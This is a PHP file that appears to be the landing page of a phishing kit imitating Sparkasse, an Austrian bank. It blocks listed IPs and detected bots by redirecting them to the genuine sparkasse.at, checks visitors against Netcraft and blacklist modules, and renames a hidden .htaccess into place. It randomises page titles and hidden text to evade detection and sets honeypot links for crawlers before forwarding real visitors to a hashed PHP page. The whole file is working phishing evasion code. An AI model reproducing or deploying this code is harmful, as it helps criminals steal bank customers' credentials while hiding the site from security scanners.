<?php
//Dwi F.D 

error_reporting(E_ALL);
require 'remote/zero.php';
include 'remote/100.php';
include 'remote/200.php';
include 'remote/300.php';
include 'remote/400.php';
require 'remote/index.php';
require 'remote/netcraft_check.php';
require 'remote/blacklist_lookup.php';

$filename = '2617d44145d0300cdf70349b2f3cac79.txt';
$ip_to_search = $_SERVER['REMOTE_ADDR'];

if (false !== strpos(file_get_contents($filename), $ip_to_search)) {
  header("Location: https://href.li/?https://sparkasse.at");
  $line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
  file_put_contents('newBlockedIP.log', $line . PHP_EOL, FILE_APPEND);
  session_destroy();
  die();
} else {
  // otherwise
}

if (file_exists('ht.access')) {
  rename('ht.access', '.htaccess');
}

$user_ip =  isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['HTTP_X_FORWARDED_FOR'])  ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR']);

$antiBot = new botCheck($user_ip);
$trueIP = new botCheck(kenshinSamouraIP());

if ($antiBot->isBot() || $trueIP->isBot()) {
  header("Location: https://href.li/?https://sparkasse.at");
} else {
}

function vladPt($len = 10)
{
  $word = array_merge(range('a', 'z'), range('A', 'Z'));
  shuffle($word);
  return substr(implode($word), 0, $len);
}

$a = array("unity", "news", "mean", "purpose", "intervention", "inside", "middle", "medium", "translate", "read", "spokesperson", "crossing", "period", "bowel", "fascinate", "suspicion", "feeling", "flood", "innovation", "stock", "reverse", "speculate", "detective", "investment", "guest", "physical", "anger", "publication", "exit", "loop", "blue jean", "twitch", "appointment", "athlete", "reporter", "voyage", "joy", "try", "litigation", "parachute", "judicial", "law", "judge", "justice", "deprive", "discreet", "piano", "child", "calorie", "favor", "lion", "affinity", "oven", "knee", "stab", "horse", "sweater", "experienced", "laboratory", "union", "maze", "ignorance", "ignorant", "shallow", "bald", "soft", "bare", "girlfriend", "secular", "island", "site", "ground", "landowner", "name", "lick", "theft", "cathedral", "tiger", "great", "river", "crowd", "stage", "range", "pumpkin", "whip", "endure", "permanent", "tension", "fashion", "crime", "grass", "save", "store", "leadership", "blade", "leaf", "thin", "jump", "academy", "resign", "farewell", "depart", "talk", "leftovers", "action", "trustee", "liability", "opinion", "zero", "midnight", "yard", "volume", "boat", "belly", "demand", "intelligence", "literacy", "voice", "miserable", "free", "growth", "residence", "apathy", "majority", "fast", "outline", "degree", "gas pedal", "emphasis", "positive", "achieve", "achievement", "agreement", "history", "account", "recognize", "accumulation", "experience", "charge", "star",);
$keyGen = array_rand($a, 20);
$randomGen = genwords(20);

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="keywords" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>&nbsp;&nbsp;&nbsp; <?= $a[$keyGen[4]]; ?> - <?= $a[$keyGen[0]]; ?> </title>
        <style>
            .genCSS {
                color: white;
                font-size: 11px;
                position: absolute;
                left: 0px;
                top: 0px;
                z-index: -13;
                opacity: 0;
            }

            body, a {
                text-decoration: none !important;
                display: none
            }
        </style>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.0/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
                $.get("remote/fetch.php", function(data, status) {
                    window.location.href = 'c9f7198c57735fa7a7a8ac2cc18dd542.php';
                });
            })
        </script>
    </head>
    <body> 
        <?= new_genwords(rand(10, 30), $randomGen); ?> 
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <a href="files/vendor/">
            <p class="genCSS"> <?= $randomGen[array_rand($randomGen)]; ?> </p>
        </a>
        <form action="files/vendor/" method=POST>
            <div style="display:none;">
                <input type=text>
                <button style="display:none" type="submit">Submit button</button>
            </div>
        </form>
        <noscript>
            <form action="files/vendor/" method=POST>
                <div style="display:none;">
                    <input type=text>
                    <button style="display:none" type="submit">Submit button</button>
                </div>
            </form>
        </noscript>
        <noscript>
            <a rel="nofollow" style="display:none;" href="files/vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
        </noscript>
        <a rel="nofollow" style="display:none;" href="files/vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
        <noscript>
            <a rel="nofollow" style="display:none;" href="files/vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
        </noscript>
        <a rel="nofollow" style="display:none;" href="files/vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
        <noscript>
            <a rel="nofollow" style="display:none;" href="files/vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
        </noscript>
        <a rel="nofollow" style="display:none;" href="files/vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>
    </body>
</html>